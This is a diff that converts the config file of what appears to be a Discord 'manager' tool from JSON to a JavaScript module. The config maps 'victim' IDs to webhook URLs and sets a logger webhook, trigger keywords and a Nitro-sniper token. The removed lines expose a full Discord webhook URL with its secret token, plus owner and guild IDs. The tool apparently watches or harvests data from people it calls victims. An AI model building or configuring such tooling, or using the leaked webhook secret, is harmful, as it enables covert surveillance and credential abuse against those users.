@@ -1,37 +1,36 @@
-{
-    "token": "VOTRE_TOKEN_MANAGER_ICI",
-    "premium_disable": true,
+module.exports = {
+    token: process.env.MANAGER_TOKEN,
+    premium_disable: true,
     
-    "victimes": {
-        "ID_VICTIME_1": "WEBHOOK_URL_1",
-        "ID_VICTIME_2": "WEBHOOK_URL_2",
-        "ID_VICTIME_3": "WEBHOOK_URL_3"
+    victimes: {
+        "ID_VICTIME_1": process.env.WEBHOOK_VICTIME_1,
+        "ID_VICTIME_2": process.env.WEBHOOK_VICTIME_2,
+        "ID_VICTIME_3": process.env.WEBHOOK_VICTIME_3
     },
     
-    "logger_webhook": "https://discordapp.com/api/webhooks/1407503555660615690/IBOzJ_DNLi-76FTfr6IRQ2PlEdZ5kWMx_aAywkhUb5EdaklARDuWJEjGwa5qI7En_fI7",
-    "logger_words": [
-        "MOT_CLÉ_1",
-        "MOT_CLÉ_2",
-        "MOT_CLÉ_3"
+    logger_webhook: process.env.LOGGER_WEBHOOK,
+    logger_words: [
+        process.env.WORD_1 || "MOT_CLÉ_1",
+        process.env.WORD_2 || "MOT_CLÉ_2",
+        process.env.WORD_3 || "MOT_CLÉ_3"
     ],
     
-    "counters": {
+    counters: {
         "ID_SALON_1": "💎・Users: <wl>",
         "ID_SALON_2": "🔱・Membres: <members>"
     },
     
-    "senju": "TOKEN_SENJU_NITRO_SNIPER",
+    senju: process.env.SENJU_TOKEN,
     
-    "guild_id": "1370166833185034400",
-    "log_channel": "1407503801765728319",
-    "staff_role": "1406209324585320530",
-    "whitelist_role": "1406209375520952370",
+    guild_id: process.env.GUILD_ID,
+    log_channel: process.env.LOG_CHANNEL,
+    staff_role: process.env.STAFF_ROLE,
+    whitelist_role: process.env.WHITELIST_ROLE,
     
-    
-    "owners": [
-        "934575429807898654",
-        "ID_OWNER_2"
+    owners: [
+        process.env.OWNER_1,
+        process.env.OWNER_2
     ],
     
-    "users": []
-}
+    users: []
+};
